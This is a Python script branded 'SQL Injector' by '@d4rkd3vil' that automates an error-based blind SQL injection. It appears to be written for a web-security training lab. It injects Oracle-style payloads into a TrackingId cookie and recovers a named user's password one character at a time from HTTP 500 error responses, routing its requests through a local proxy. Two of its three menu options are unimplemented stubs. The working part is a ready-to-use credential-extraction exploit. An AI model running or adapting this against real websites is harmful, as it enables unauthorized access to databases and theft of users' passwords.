import sys
import requests
import urllib3
import urllib.parse
import time  # For adding delays if needed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies configuration
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url, username, base_trackingid, session_cookie):
    password_extracted = ""
    
    for i in range(1, 21):  # Assuming password length up to 20 characters
        for j in range(32, 126):  # ASCII range for printable characters
            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='%s' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (username,i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': base_trackingid + sqli_payload_encoded,
                'session': session_cookie
            }
            
            try:
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                #print(f"\nDebug: For position {i}, ASCII {j} ({chr(j)}), Status code: {r.status_code}")  # Debug print
                
                if r.status_code == 500:  # Error occurred, so this character is correct
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break  # Move to next character
                else:  # No error, so this character is not correct
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                    # Continue to next j without breaking
                    time.sleep(0.5)  # Optional: Add a short delay to make output visible
            except requests.exceptions.RequestException as e:
                print(f"Request error occurred: {e}")
                sys.exit(1)  # Exit on error

    print("\nDebug: Password extraction completed. Final extracted: " + password_extracted)  # Final debug message

def main():
    # Welcome banner
    print("=====================================")
    print("     Welcome to SQL Injector        ")
    print("                          @d4rkd3vil")
    print("=====================================")
    print("Select an option:")
    print("1. SQLi")
    print("2. Blind SQLi")
    print("3. Blind SQLi with error response")
    
    choice = input("Enter your choice (1/2/3): ")
    
    if choice == '1':
        print("SQLi not implemented yet.")
    elif choice == '2':
        print("Blind SQLi not implemented yet.")
    elif choice == '3':
        print("Running Blind SQLi with error response...")
        
        url = input("Enter the URL: ")
        username = input("Enter the username: ")
        base_trackingid = input("Enter the base TrackingId: ")
        session_cookie = input("Enter the session cookie: ")
        
        print("Retrieving users password...")
        sqli_password(url, username, base_trackingid, session_cookie)
    else:
        print("Invalid choice. Please run the program again and select 1, 2, or 3.")

if __name__ == "__main__":
    main()
